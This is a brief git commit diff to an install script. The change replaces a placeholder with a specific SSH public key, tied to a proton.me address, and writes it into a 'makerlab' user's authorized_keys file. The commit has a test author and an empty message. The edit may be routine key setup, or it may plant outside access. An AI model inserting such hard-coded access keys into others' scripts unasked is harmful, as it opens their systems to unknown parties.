e41bef4267dcbdcf06870ff5fd76b41384a529d0
Test <test@test.com>
2026-03-29 16:44:28 +0200

    .

--- install.sh
+++ install.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 mkdir -p /home/makerlab/.ssh
-echo "YOUR_PUBLIC_KEY_CONTENT_HERE" > /home/makerlab/.ssh/authorized_keys
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB9wCncpVnSY1LVnunRpW5E6iJSuxYZOQhwFg+3era+2 whoveterinarianlearn@proton.me" > /home/makerlab/.ssh/authorized_keys
 chmod 700 /home/makerlab/.ssh
 chmod 600 /home/makerlab/.ssh/authorized_keys
